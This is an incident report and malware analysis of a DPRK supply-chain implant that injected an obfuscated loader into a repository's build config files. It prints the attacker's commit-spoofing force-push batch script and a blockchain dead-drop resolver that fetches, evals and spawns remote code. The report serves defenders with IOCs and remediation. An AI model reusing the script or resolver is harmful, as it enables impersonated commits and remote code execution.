---
title: "Incident Report: PolinRider — a Blockchain Dead-Drop Supply-Chain Compromise"
date: 2026-05-15
draft: false
tags: [incident-response, supply-chain, malware, lazarus-group, dprk, blockchain, git, github, threat-intel, deobfuscation, malware-analysis]
---

{{< note >}}
This write-up covers a real incident I investigated and led as the security
lead. All client identity, employee names, GitHub handles, repository names,
and infrastructure details have been **redacted or replaced with generic
placeholders**. Technical indicators of compromise (malicious commit hashes,
obfuscation logic, malware behavior, blockchain addresses used by the
attacker) are kept as-is since they are useful to defenders and are not tied
to any private party.
{{< /note >}}

## |=---[ TL;DR ]

A developer's workstation on a client project was infected with a DPRK
(North Korea / Lazarus Group) supply-chain implant tracked publicly as
**PolinRider** (delivery stage: **Beavertail**, RAT stage: **InvisibleFerret**).
The malware auto-injected an obfuscated JavaScript loader into the project's
GitHub repository, disguised the malicious commit as coming from a trusted
teammate using `git commit --amend`, and force-pushed it to `main`. The
payload ran twice during CI/CD deploys before being caught. It didn't fetch
its second stage from a normal C2 server — it read the address out of
**live blockchain transactions**, a technique that makes the malware
effectively impossible to take down.

```text
Incident ID:   IR-2026-001
Window:        Apr 23 – Apr 26, 2026
Detected:      Root-caused May 14, 2026 (initial containment Apr 26)
Attacker:      DPRK-aligned (Lazarus cluster: PolinRider / Void Dokkaebi /
               UNC5342 "Contagious Interview" / Famous Chollima)
Vector:        Compromised developer workstation (initial access unconfirmed)
Impact:        1 of 5 audited repositories infected; 2 CI builds ran the
               payload for ~45 min each before containment; production
               unaffected
```

## |=---[ Background: what you need to know first ]

A few concepts this post leans on, explained up front so nothing after this
section requires prior security knowledge:

- **Supply-chain attack**: instead of attacking a company's servers
  directly, the attacker compromises something upstream that the company
  trusts and pulls in automatically — a dependency, a build script, or in
  this case, a developer's own machine and git history.
- **Force push (`git push -f`)**: normally, git refuses to let you push a
  commit that rewrites history someone else already has, because it would
  silently delete work. A force push overrides that safety check and
  replaces the remote history anyway.
- **`git commit --amend`**: rewrites the *most recent* commit instead of
  creating a new one — same author, same message, same timestamp if you
  want, but different file contents and a different commit hash.
- **CI/CD deploy**: most modern web apps auto-build and auto-deploy every
  time code is pushed (here: GitHub → Vercel). That means a malicious commit
  doesn't need a human to run it — a push is enough to get code executed on
  a server.
- **Dead-drop resolver**: rather than hardcoding a command-and-control (C2)
  server address in the malware (which gets sinkholed/blocked fast),
  the malware fetches the address from somewhere neutral and hard to take
  down. Here, that "somewhere" is a public blockchain — a transaction sent
  to a wallet address is basically permanent and censorship-resistant, so
  the attacker can rotate infrastructure just by publishing a new
  transaction. This general trick is publicly documented as
  **EtherHiding**.

## |=---[ Scope ]

| Component | Notes |
|---|---|
| Source control | GitHub, 5 repositories audited |
| Deployment | Vercel — auto-deploy on push, no manual gate, no CI security scanning |
| Repos affected | 1 of 5 (the client's main web app) |
| People involved | Project owner (repo admin), a developer (workstation later confirmed as patient zero), myself (investigation lead) |

## |=---[ Timeline ]

All times GMT+2, redacted account names replaced with roles.

| Date / Time | Event |
|---|---|
| before Apr 23 | Developer's workstation compromised by an unknown initial vector (candidates below) |
| Apr 23 | Project owner pushes a clean, legitimate commit to `main`. CI passes. |
| Apr 24 | Developer merges `main` into their feature branch. Still clean. |
| **Apr 25, 02:44** | Malware executes locally on the developer's machine. It reads the *project owner's* last commit metadata, injects the PolinRider payload into two config files, amends the commit with `git commit --amend --no-verify`, and **force-pushes to `main` under the developer's authenticated GitHub session — while making the commit look authored by the project owner.** |
| Apr 25, 22:35 | Developer merges the now-infected `main` into their own branch, propagating the payload. Second CI build runs it. |
| Apr 26 | Project owner notices the CI checks are failing, inspects the diff, identifies and strips the injected payload. Clean commits follow. |
| May 14 | Full static deobfuscation and GitHub activity-log analysis performed (this investigation). Root cause and patient zero conclusively identified. |

## |=---[ Root cause: how a force push gets attributed to the wrong person ]

This is the single most important technical finding, because it's the part
that initially pointed the finger at the wrong machine.

**A git commit's metadata (author name, author email) is just text you can
set yourself.** It proves nothing on its own:

```bash
git config --local user.name  "someone else"
git config --local user.email "someone.else@example.com"
git commit --amend -m "same message as before" --no-verify
```

That command rewrites the current commit so it *looks* authored by whoever
you typed — same message, any timestamp you want if you also spoof the
system clock first. What it **can't** spoof is *who pushed it*: GitHub's
activity log ties every push event to the authenticated session that
performed it, independent of what the commit metadata claims.

That's exactly the mismatch that broke this case open:

- The malicious commit's **author field** read: project owner.
- The GitHub **activity log** read: *pushed by the developer's account,
  force push*.

Two people, one commit. The commit metadata lies; the push event doesn't.

The malware automated this exact sequence with a batch script. A cleaned-up,
annotated version (this is a documented, publicly known artifact of this
campaign, not something I wrote):

```bat
@echo off
REM Step 1: capture the last commit's metadata (author/date/message)
for /f "delims=" %%A in ('git log -1 --format^=%%an') do set USER_NAME=%%A
for /f "delims=" %%A in ('git log -1 --format^=%%ae') do set USER_EMAIL=%%A
for /f "delims=" %%A in ('git log -1 --format^=%%s')  do set LAST_MSG=%%A
for /f "delims=" %%A in ('git log -1 --date^=format-local:%%Y-%%m-%%d --format^=%%cd') do set LAST_DATE=%%A
for /f "delims=" %%A in ('git log -1 --date^=format-local:%%H:%%M:%%S --format^=%%cd') do set LAST_TIME=%%A
for /f "delims=" %%A in ('git rev-parse --abbrev-ref HEAD') do set BRANCH=%%A

REM Step 2: roll the system clock back to match the original commit time
set OLD_DATE=%date%
set OLD_TIME=%time%
date %LAST_DATE%
time %LAST_TIME%

REM Step 3: impersonate the original author locally
git config --local user.name  "%USER_NAME%"
git config --local user.email "%USER_EMAIL%"

REM Step 4: stage the malware's changes and amend, bypassing hooks
git add .
git commit --amend -m "%LAST_MSG%" --no-verify

REM Step 5: restore the system clock
date %OLD_DATE%
time %OLD_TIME%

REM Step 6: force-push, bypassing pre-push hooks too
git push -uf origin %BRANCH% --no-verify
@echo on
```

Every step earns its place:

- `--no-verify` on both the commit and the push skips any local
  pre-commit/pre-push hooks that might otherwise catch the change (linting,
  secret scanning, etc.).
- The clock manipulation means `git log` shows a commit timestamp
  indistinguishable from the original.
- Setting `user.name`/`user.email` locally means the *content* of the
  commit points at someone who never touched the malicious code.
- `-uf` is a force push that also sets the branch's upstream tracking, so it
  silently overwrites the clean commit on the remote.

The only forensic seam left is the one static git metadata can't fake: the
authenticated push event on GitHub's side.

## |=---[ Reconstructed attack sequence ]

1. Developer's workstation is compromised via an unconfirmed initial vector
   (see next section).
2. The RAT locates a local clone of the client repo with `main` checked out.
3. It finds a config file used by the build tooling (here: a CSS framework
   config file, a common target for this campaign — see IOCs) and appends
   an obfuscated loader after the legitimate content.
4. The batch script above runs, impersonating the last legitimate committer
   and force-pushing to `main`.
5. GitHub logs the push under the developer's session; the commit itself
   claims a different author.
6. The push triggers an auto-deploy. The CI/build environment executes the
   injected JavaScript for the first time.
7. The infected `main` later gets merged elsewhere by a human doing normal
   work, triggering a second build/execution.

## |=---[ Initial access vector (unresolved) ]

I was not able to conclusively determine how the developer's workstation
was first compromised — this remains the one open item from the
investigation. Based on how this campaign has operated elsewhere, in order
of likelihood:

1. **Malicious VS Code extension** that runs the loader on install or
   workspace open.
2. **Typosquatted npm package** (e.g. a package name one character off from
   a popular CSS/build tool) with a malicious `postinstall` hook.
3. **Fake recruiter "coding assessment"** — a weaponized take-home test
   repository handed to freelance/contract developers, a documented lure
   for this exact threat cluster.
4. **Malicious `.vscode/tasks.json`** with a `runOn: folderOpen` task that
   pipes a remote script into a shell the moment the project folder is
   opened in an editor.

{{< note >}}
If you take one operational lesson from this section: **never run an
unfamiliar "coding challenge" repository's tasks, extensions, or
`postinstall` scripts on a machine that also holds real project access.**
Use a disposable VM or container for anything sent to you by a stranger,
including recruiters.
{{< /note >}}

## |=---[ Technical analysis: peeling four layers of obfuscation ]

The payload wasn't executed dynamically to analyze it — it was fully
statically deobfuscated instead. Before executing *any* helper function
from the sample to decode strings, each one was manually verified to
contain **only** pure string operations (`charAt`, `split`, `join`, array
indexing, character-code math) and checked against a blocklist
(`eval`, `Function`, `require`, `process`, `child_process`, `fetch`,
`http(s)`, `import`, `fs`, `spawn`, `exec`). Only functions that passed were
ever run, in an isolated Node.js REPL with no network access.

**Layer 0 — outer wrapper.** An IIFE that decodes a short string using a
seeded Fisher–Yates-style array shuffle:

```js
var _$_1e42 = (function (l, e) {
  var h = l.length, g = [];
  for (var j = 0; j < h; j++) g[j] = l.charAt(j);
  for (var j = 0; j < h; j++) {
    var s = e * (j + 489) + (e % 19597);
    var w = e * (j + 659) + (e % 48014);
    var t = s % h, p = w % h;
    var y = g[t]; g[t] = g[p]; g[p] = y;
    e = (s + w) % 4573868;
  }
  return g.join('').split('%').join(String.fromCharCode(127))
          .split('#1').join('%').split('#0').join('#')
          .split(String.fromCharCode(127));
})("rmcej%otb%", 2857687);
```

This decodes to `["r", "undefined", "m"]`, which the malware uses to stash
`require` and `module` onto the global object under one-character keys
(`global["r"] = require`). Grepping for the literal string `require` in this
file finds nothing — that's the point.

**Layer A — a second decoder, feeding `Function.prototype.constructor`.**
A function using the same shuffle algorithm with a different seed decodes
the string `"constructor"`, then does:

```js
var dgC = sfL["constructor"];   // == Function
var xBg = dgC("", sfL(joW));    // == Function("", decodedBody)  ~= eval
```

`Function()` is functionally equivalent to `eval()` for this purpose but
doesn't contain the literal substring `eval`, so it also slides past naive
static scanners.

**Layer B — an intermediate decoder** produced by running Layer A's output.
It's another string-transform function; running it against a large encoded
blob produces the final, human-readable payload source.

**Layer C — a 58-entry string table**, referenced throughout the final
payload as `_$_ccfc[N]`, decoded with the same shuffle primitive (different
seed again). Substituting every table lookup turns the payload from
unreadable into a normal, readable script.

```text
Layer 0 (pure)  -> ["r", "undefined", "m"]      (stash require/module globally)
Layer A (pure)  -> "constructor"                (decode a property name)
                 -> Function("", <Layer B blob>)  (eval-equivalent, evades grep)
Layer B (pure, run once as a transform) -> raw payload source
Layer C (pure)  -> 58-entry string table, substituted into the payload
```

## |=---[ What the payload actually does ]

Once fully decoded, the payload contains no destructive logic of its own —
it's purely a **resolver** that fetches the second-stage payload at
runtime from blockchain transactions. Annotated pseudocode:

```js
(async () => {
  const req = global["r"];                 // == require
  global["_V"] = "A4-2212";                 // campaign/version marker

  async function resolveDeadDrop(xorKey, tronAddr, aptosAddr) {
    let raw;
    try {
      // 1. latest outgoing TRON transaction from a fixed wallet
      raw = await fetchLatestTronTx(tronAddr);        // api.trongrid.io
    } catch {
      // 2. fallback: an Aptos transaction instead
      raw = await fetchAptosTx(aptosAddr);             // fullnode.mainnet.aptoslabs.com
    }
    // the tx data itself encodes a second address (BSC)
    const bscTxHash = extractHashFrom(raw);

    // 3. fetch that BSC transaction, its calldata IS the payload,
    //    XOR-"decrypted" with a hardcoded key
    const input = await eth_getTransactionByHash(bscTxHash);  // public BSC RPC
    return xorDecrypt(input, xorKey);
  }

  // anti-rerun guard
  if (global["_p_t"] && Date.now() - global["_p_t"] < 30000) return;
  global["_p_t"] = Date.now();

  // Path 1: execute in the current process
  try { eval(await resolveDeadDrop(KEY1, TRON_ACCT_1, APTOS_TX_1)); } catch {}

  // Path 2: also spawn a hidden, detached child process for persistence
  try {
    const payload2 = await resolveDeadDrop(KEY2, TRON_ACCT_2, APTOS_TX_2);
    req("child_process").spawn("node", ["-e", payload2], {
      detached: true, stdio: "ignore", windowsHide: true
    });
  } catch {}
})();
```

Why this design is nasty:

- **No fixed C2 domain or IP to block.** The "address" the malware calls
  home to is a wallet address on a public blockchain. Blockchains don't
  take down transactions, so the dead drop can't be sinkholed the way a
  malicious domain can.
- **Trivial infrastructure rotation.** The attacker just needs to send a
  new transaction from the same wallet; every infected machine picks it up
  automatically on its next run.
- **Two independent chains as fallback** (TRON, with Aptos as backup, and
  the actual payload delivered via a Binance Smart Chain transaction's
  calldata) makes the resolver resilient even if one chain's public RPC
  endpoint is blocked.
- **Dual execution paths**: an in-process `eval` and a separately spawned,
  detached, hidden Node child process, so killing one doesn't kill the
  other.

{{< note >}}
Because the actual second-stage payload lives on-chain and can be swapped by
the attacker at any time, its exact behavior during this specific infection
window can't be fully reconstructed after the fact from the loader alone.
Based on public reporting on this campaign, the expected chain is
**Beavertail** (an OS-fingerprinting loader) → **InvisibleFerret** (a
cross-platform RAT that targets credentials, SSH keys, crypto wallets,
browser data, and environment variables). Beavertail is documented to
detect and avoid CI/CD sandbox environments, which is the likely reason the
Vercel build containers only ran stage 1 and part of stage 2, rather than
fully installing the RAT.
{{< /note >}}

## |=---[ Indicators of compromise ]

Blockchain addresses, XOR keys, and RPC endpoints below are attacker
infrastructure, not private data — kept for defenders. Anything tied to the
client or its employees has been removed.

| Category | Value |
|---|---|
| Loader marker | `global['!']='4-2212'` |
| State globals | `global['_V']`, `global['_p_t']`, `global['r']` (=`require`), `global['m']` (=`module`) |
| Payload delimiter | `"?.?"` |
| Network C2 | `api.trongrid.io`, `fullnode.mainnet.aptoslabs.com`, `bsc-dataseed.binance.org`, `bsc-rpc.publicnode.com` |
| Behavioral | `child_process.spawn('node', ['-e', ...])` with `detached:true, windowsHide:true, stdio:'ignore'` |
| Known artifact | `temp_auto_push.bat` — the git-history-falsification script |
| File targets | build config files: `tailwind.config.js`, `postcss.config.mjs`, `next.config.mjs`, `eslint.config.mjs`, `babel.config.js`, `vite.config.*` |
| Git indicators | force pushes that replace a passing CI commit with a failing one; `global['!']` present in any JS file; `.woff2` files containing JS; `.vscode/tasks.json` with `runOn: folderOpen` |

## |=---[ Impact assessment ]

- **CI/CD environment**: had access to all configured deploy-time
  environment variables for the affected project during both timed-out
  builds. Assessed exposure: mostly low-risk public keys plus one
  medium-risk private key (used for sending push notifications — rotated).
  A high-privilege database admin key was **not** present in that
  environment, which significantly limited the blast radius.
- **Compromised developer's workstation**: assumed fully compromised.
  Browser-saved passwords and session cookies, SSH private keys, any local
  `.env` secrets, GitHub session tokens, npm auth tokens, and anything
  copied to clipboard during the infection window must all be treated as
  stolen.
- **Other repositories / projects**: verified clean by searching full git
  history (not just current `HEAD`) across every repo and branch for the
  known obfuscation markers, plus `.vscode/tasks.json` and suspicious
  `.woff2` binary additions. Only the one project showed hits.
- **Production**: not affected. Both malicious builds were caught (one by
  the diff being manually reviewed the next day) before promotion.

## |=---[ Remediation ]

**Completed:**
- Malicious payload stripped from the affected repo; history corrected.
- All repositories verified clean via history search.
- Full static deobfuscation and IOC extraction (this document).
- Patient-zero machine positively identified via GitHub activity-log
  analysis, correcting an earlier, wrong assumption about which developer's
  machine was compromised.

**Required on the compromised workstation:**
1. Disconnect it from all access immediately.
2. **Do not run antivirus/cleanup yet** — preserve forensic evidence first
   (process list, network connections, startup items, scheduled tasks,
   installed editor extensions, recently installed packages, and search
   for hidden `node_modules` and the `temp_auto_push.bat`/equivalent
   artifact).
3. Interview the developer: any editor extensions or packages installed
   recently? Any recruiter contact or take-home coding test in that
   window? Any unfamiliar repos cloned or opened?
4. Rotate every credential that ever touched that machine: git hosting
   sessions and personal access tokens, SSH keypairs, package-manager
   tokens, database service keys if stored locally, every browser-saved
   password.
5. Full OS reinstall.
6. Post-reinstall: fresh SSH keys, fresh auth tokens, only editor
   extensions from verified publishers.

**Required on infrastructure:**
- Rotate every deploy-time secret that was live during the two infected
  builds, even the "low risk" ones.
- Rotate any server SSH keys the workstation could reach; audit auth logs
  for the infection window.
- Review database/API logs for unusual calls from unfamiliar IPs during
  the same window.
- Enable 2FA everywhere it isn't already on.

**Recommended, long-term:**
- **Enable branch protection**: require PR review before merging to `main`,
  and **disable force pushes** on protected branches. This single control
  would have prevented this entire incident — the malware fundamentally
  depends on being able to force-push over legitimate history.
- Add a CI step that fails the build if it finds the literal string
  `eval(` or `Function(` combined with network access in a config file that
  shouldn't need either.
- Treat any "recruiter" who sends a git repo to clone as hostile until
  proven otherwise; open it only in a disposable sandbox.

## |=---[ Attribution ]

This incident matches, with high confidence, a campaign publicly tracked
under several names by different vendors — same DPRK-aligned actor cluster,
different researchers, different codenames:

| Tracker | Designation |
|---|---|
| Public malware trackers | PolinRider |
| Trend Micro | Void Dokkaebi |
| Google / Mandiant | UNC5342 ("Contagious Interview") |
| CrowdStrike | Famous Chollima |
| Palo Alto Networks | Contagious Interview |

Public reporting as of this incident put the campaign's footprint at over
1,900 compromised public GitHub repositories across more than 1,000 unique
account owners, with credential and cryptocurrency theft as the primary
goal and supply-chain propagation as a secondary one.

## |=---[ Takeaways ]

- **A commit's author field is not evidence of who pushed it.** If you're
  investigating a suspicious commit, always cross-reference the platform's
  activity/audit log (which is tied to an authenticated session) against
  the commit metadata (which is just text anyone can set).
- **Force pushes to `main` should not be possible in the first place.**
  Branch protection with required reviews turns this entire attack chain
  into a rejected push.
- **CI/CD is code execution.** Anything that can reach your git history can
  reach your build server and, from there, your production environment
  variables. Treat developer workstations with production-adjacent repo
  access as high-value targets, because attackers already do.
- **Blockchain dead-drops are a real, growing C2 technique.** If your
  detection tooling only flags known-bad domains/IPs, it will miss this
  class of malware entirely — you need to flag the *behavior* (config
  files making outbound blockchain RPC calls at build time) instead.

## |=---[ References ]

- OpenSourceMalware, "PolinRider: DPRK Threat Actor That Compromised
  Hundreds of GitHub Repos Is Unmasked"
- Trend Micro, "Void Dokkaebi Uses Fake Job Interview Lure to Spread
  Malware via Code Repositories"
- Google Threat Intelligence Group, "DPRK Adopts EtherHiding: Nation-State
  Malware Hiding on Blockchains"

Related: [Incident Report: a Second PolinRider Attempt — Caught by the
Attacker's Own Bug]({{< relref "polinrider-force-push-syntax-error.md" >}})
